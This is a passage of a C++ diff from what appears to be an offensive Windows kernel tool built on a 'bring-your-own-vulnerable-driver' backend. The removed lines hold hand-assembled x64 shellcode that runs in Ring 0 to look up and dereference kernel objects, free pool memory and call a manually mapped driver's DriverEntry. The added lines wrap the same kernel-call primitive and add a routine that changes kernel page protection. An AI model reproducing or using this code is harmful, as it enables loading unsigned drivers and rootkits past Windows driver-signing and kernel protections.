-    auto Emit = [&](const std::initializer_list<uint8_t>& bytes) { sc.insert(sc.end(), bytes); };
-    auto PushU64 = [&](uint64_t v) {
-        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
-    };
-
-    // movabs rcx, 0 (patched -> ctxBase)
-    Emit({ 0x48, 0xB9 }); PushU64(0);
-    // movabs rdx, 0 (unused)
-    Emit({ 0x48, 0xBA }); PushU64(0);
-
-    // push rbx
-    Emit({ 0x53 });
-    // mov rbx, rcx
-    Emit({ 0x48, 0x89, 0xCB });
-    // sub rsp, 0x60
-    Emit({ 0x48, 0x81, 0xEC, 0x60, 0x00, 0x00, 0x00 });
-
-    // rcx = UNICODE_STRING (kernel address)
-    Emit({ 0x48, 0x8B, 0x4B, 0x18 });       // mov rcx, [rbx+0x18]
-    // rdx = Attributes = 0
-    Emit({ 0x48, 0x31, 0xD2 });
-    // r8  = PassedAccessState = NULL
-    Emit({ 0x4D, 0x31, 0xC0 });
-    // r9  = DesiredAccess = 0
-    Emit({ 0x4D, 0x31, 0xC9 });
-    // arg5 = ObjectType = *IoDriverObjectType
-    Emit({ 0x48, 0x8B, 0x43, 0x10 });       // mov rax, [rbx+0x10]
-    Emit({ 0x48, 0x8B, 0x00 });             // mov rax, [rax]
-    Emit({ 0x48, 0x89, 0x44, 0x24, 0x20 }); // [rsp+0x20] = rax
-    // arg6 = AccessMode = KernelMode (0)
-    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00 });
-    // arg7 = ParseContext = NULL
-    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00 });
-    // arg8 = Object = &objectOut
-    Emit({ 0x48, 0x8D, 0x43, 0x20 });       // lea rax, [rbx+0x20]
-    Emit({ 0x48, 0x89, 0x44, 0x24, 0x38 }); // [rsp+0x38] = rax
-    Emit({ 0x48, 0x8B, 0x43, 0x08 });       // mov rax, [rbx+0x08]
-    Emit({ 0xFF, 0xD0 });                   // call rax
-    Emit({ 0x48, 0x8B, 0x53, 0x20 });       // mov rdx, [rbx+0x20] (object pointer)
-    Emit({ 0x48, 0x89, 0x13 });             // mov [rbx], rdx (store to ctx[0])
-
-    // add rsp, 0x60
-    Emit({ 0x48, 0x81, 0xC4, 0x60, 0x00, 0x00, 0x00 });
-    // pop rbx
-    Emit({ 0x5B });
-    // ret
-    Emit({ 0xC3 });
-
-    ContextBuilder buildCtx = [obRef, ioDriverType, driverName, nameLenBytes](uint64_t base) {
-        // Layout in scratch page:
-        // base + 0x000: context (5 qwords)
-        // base + 0x040: UNICODE_STRING (16 bytes)
-        // base + 0x050: name buffer (wide chars)
-        std::vector<uint8_t> ctx(0x100, 0);
-
-        uint64_t unicodeVa = base + 0x40;
-        uint64_t nameVa = base + 0x50;
-
-        uint64_t* q = reinterpret_cast<uint64_t*>(ctx.data());
-        q[0] = 0;            // result placeholder
-        q[1] = obRef;
-        q[2] = ioDriverType;
-        q[3] = unicodeVa;
-        q[4] = 0;            // objectOut placeholder
-
-        UNICODE_STRING* us = reinterpret_cast<UNICODE_STRING*>(ctx.data() + 0x40);
-        us->Length = static_cast<USHORT>(nameLenBytes);
-        us->MaximumLength = static_cast<USHORT>(nameLenBytes + sizeof(wchar_t));
-        us->Buffer = reinterpret_cast<PWSTR>(nameVa);
-
-        std::memcpy(ctx.data() + 0x50, driverName, nameLenBytes);
-        return ctx;
-    };
-
-    uint64_t result = 0;
-    if (!ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, &result)) {
-        std::cerr << "[hinv::kmem] GetDriverObject shellcode execution failed\n";
-        return 0;
-    }
-
-    return result;
-}
-
-// ---------------------------------------------------------------------------
-// Decrement reference count on a kernel object
-// ---------------------------------------------------------------------------
-
-bool DereferenceObject(byovd::IByovdBackend* backend, uint64_t objectAddress) {
-    if (!backend || !objectAddress) return false;
-
-    uint64_t obDeref = ResolveKernelExport(backend, L"ntoskrnl.exe", "ObDereferenceObject");
-    if (!obDeref) {
-        std::cerr << "[hinv::kmem] ObDereferenceObject not found\n";
-        return false;
-    }
-
-    std::vector<uint8_t> sc;
-    auto PushU64 = [&](uint64_t v) {
-        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
-    };
-
-    // movabs rcx, 0 (patched -> ctxBase)
-    sc.insert(sc.end(), { 0x48, 0xB9 });
-    PushU64(0);
-    // movabs rdx, 0
-    sc.insert(sc.end(), { 0x48, 0xBA });
-    PushU64(0);
-    // push rbx
-    sc.insert(sc.end(), { 0x53 });
-    // mov rbx, rcx
-    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
-    // mov rcx, [rbx]        ; object address
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
-    // mov rax, [rbx+0x08]   ; ObDereferenceObject
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
-    // sub rsp, 0x28
-    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
-    // call rax
-    sc.insert(sc.end(), { 0xFF, 0xD0 });
-    // add rsp, 0x28
-    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
-    // pop rbx
-    sc.insert(sc.end(), { 0x5B });
-    // ret
-    sc.push_back(0xC3);
-
-    ContextBuilder buildCtx = [objectAddress, obDeref](uint64_t base) {
-        uint64_t data[2] = { objectAddress, obDeref };
-        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
-                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
-    };
-
-    return ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, nullptr);
-}
-
-// ---------------------------------------------------------------------------
-// Call a manually mapped driver's DriverEntry from Ring 0
-// ---------------------------------------------------------------------------
-
-uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
-                         uint64_t driverObjectVa, uint64_t registryPathVa) {
-    if (!backend || !driverEntryVa || !driverObjectVa) return STATUS_INVALID_PARAMETER;
-
-    std::vector<uint8_t> sc;
-    auto Emit = [&](const std::initializer_list<uint8_t>& bytes) { sc.insert(sc.end(), bytes); };
-    auto PushU64 = [&](uint64_t v) {
-        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
-    };
-
-    // movabs rcx, 0 (patched -> ctxBase)
-    Emit({ 0x48, 0xB9 }); PushU64(0);
-    // movabs rdx, 0
-    Emit({ 0x48, 0xBA }); PushU64(0);
-
-    // push rbx
-    Emit({ 0x53 });
-    // mov rbx, rcx
-    Emit({ 0x48, 0x89, 0xCB });
-
-    Emit({ 0x48, 0x8B, 0x43, 0x08 });       // mov rax, [rbx+0x08] (DriverEntry)
-    Emit({ 0x49, 0x89, 0xC2 });             // mov r10, rax
-    Emit({ 0x48, 0x8B, 0x53, 0x18 });       // mov rdx, [rbx+0x18] (RegistryPath)
-    Emit({ 0x48, 0x8B, 0x4B, 0x10 });       // mov rcx, [rbx+0x10] (DriverObject)
-    // sub rsp, 0x28                        ; shadow space
-    Emit({ 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
-    Emit({ 0x41, 0xFF, 0xD2 });             // call r10
-    // add rsp, 0x28
-    Emit({ 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
-    Emit({ 0x89, 0x03 });                   // mov [rbx], eax (store NTSTATUS at ctx[0])
-
-    // pop rbx
-    Emit({ 0x5B });
-    // ret
-    Emit({ 0xC3 });
-
-    ContextBuilder buildCtx = [driverEntryVa, driverObjectVa, registryPathVa](uint64_t base) {
-        uint64_t data[4] = { 0, driverEntryVa, driverObjectVa, registryPathVa };
-        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
-                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
-    };
-
-    uint64_t result = 0;
-    if (!ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, &result)) {
-        std::cerr << "[hinv::kmem] CallDriverEntry shellcode execution failed\n";
-        return STATUS_UNSUCCESSFUL;
-    }
-
-    return static_cast<uint32_t>(result);
-}
-
-// ---------------------------------------------------------------------------
-// Free kernel memory via ExFreePoolWithTag
-// ---------------------------------------------------------------------------
 
 bool FreeKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa) {
     if (!backend || !kernelVa) return false;
@@ -989,45 +455,36 @@ bool FreeKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa) {
         return false;
     }
 
-    std::vector<uint8_t> sc;
-    auto PushU64 = [&](uint64_t v) {
-        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
-    };
+    constexpr uint64_t HinvTag = 0x766E6968; // 'hinv'
+    return CallKernelFunction<void>(backend, nullptr, freeFn, kernelVa, HinvTag);
+}
 
-    // movabs rcx, 0 (patched -> ctxBase)
-    sc.insert(sc.end(), { 0x48, 0xB9 });
-    PushU64(0);
-    // movabs rdx, 0
-    sc.insert(sc.end(), { 0x48, 0xBA });
-    PushU64(0);
-    // push rbx
-    sc.insert(sc.end(), { 0x53 });
-    // mov rbx, rcx
-    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
-    // mov rcx, [rbx]        ; address to free
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
-    // mov edx, 'hinv'       ; tag
-    sc.insert(sc.end(), { 0xBA, 0x68, 0x69, 0x6E, 0x76 });
-    // mov rax, [rbx+0x08]   ; ExFreePoolWithTag VA
-    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
-    // sub rsp, 0x28         ; shadow space
-    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
-    // call rax
-    sc.insert(sc.end(), { 0xFF, 0xD0 });
-    // add rsp, 0x28
-    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
-    // pop rbx
-    sc.insert(sc.end(), { 0x5B });
-    // ret
-    sc.push_back(0xC3);
+bool ProtectKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa, size_t size, uint32_t protect) {
+    if (!backend || !kernelVa || !size) return false;
 
-    ContextBuilder buildCtx = [kernelVa, freeFn](uint64_t base) {
-        uint64_t data[2] = { kernelVa, freeFn };
-        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
-                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
-    };
+    uint64_t setProtFn = ResolveMmSetPageProtection(backend);
+    if (!setProtFn) {
+        std::cerr << "[hinv::kmem] MmSetPageProtection not found\n";
+        return false;
+    }
 
-    return ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, nullptr);
+    uint8_t ok = 0; // BOOLEAN
+    if (!CallKernelFunction(backend, &ok, setProtFn, kernelVa,
+                            static_cast<uint64_t>(size), static_cast<uint64_t>(protect)))
+        return false;
+    return ok != 0;
+}
+
+uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
+                         uint64_t driverObjectVa, uint64_t registryPathVa) {
+    if (!backend || !driverEntryVa) return STATUS_INVALID_PARAMETER;
+
+    uint32_t status = STATUS_UNSUCCESSFUL;
+    if (!CallKernelFunction(backend, &status, driverEntryVa, driverObjectVa, registryPathVa)) {
+        std::cerr << "[hinv::kmem] CallDriverEntry: kernel call failed\n";
+        return STATUS_UNSUCCESSFUL;
+    }
+    return status;
 }
 
 } // namespace kmem
